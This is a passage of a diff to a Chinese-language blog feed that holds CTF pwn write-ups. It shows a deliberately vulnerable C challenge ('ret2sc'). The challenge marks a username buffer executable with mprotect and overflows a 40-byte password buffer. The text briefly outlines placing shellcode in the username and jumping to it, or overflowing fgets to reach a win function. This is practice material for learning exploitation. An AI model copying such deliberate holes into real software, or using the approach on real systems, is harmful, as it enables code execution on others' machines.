-</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">username</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">mprotect</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">addr</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_EXEC</span> <span class="o">|</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;=== Welcome to ret2sc challenge ===&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Please enter your username and password.&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Hint: Maybe the username buffer is... *too powerful*? 🤔&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Username: &#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Password: &#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Wrong username/password! Please try again.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">vuln</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Goodbye!&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><h2 id="解題">
@@ -789,12 +606,13 @@ What is ROP?
 </h2><h3 id="解題思路">
 <a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c%e6%80%9d%e8%b7%af"></a>
 解題思路
-</h3><p>在username構建我們的payload,在password用overflow跳到username</p>
+</h3><p>利用fgets(buf, 128, stdin);的oevrflow 跳到win function 取得flag<br>
+ps:這題是32-bit題目</p>
         
-        <hr><p>本文2026-05-21首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-05-21</p>]]>
+        <hr><p>本文2026-08-13首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-13</p>]]>
       </description>
       
-        <category>SCIST pwn</category>
+        <category>Picoctf</category>
       
     </item>
     
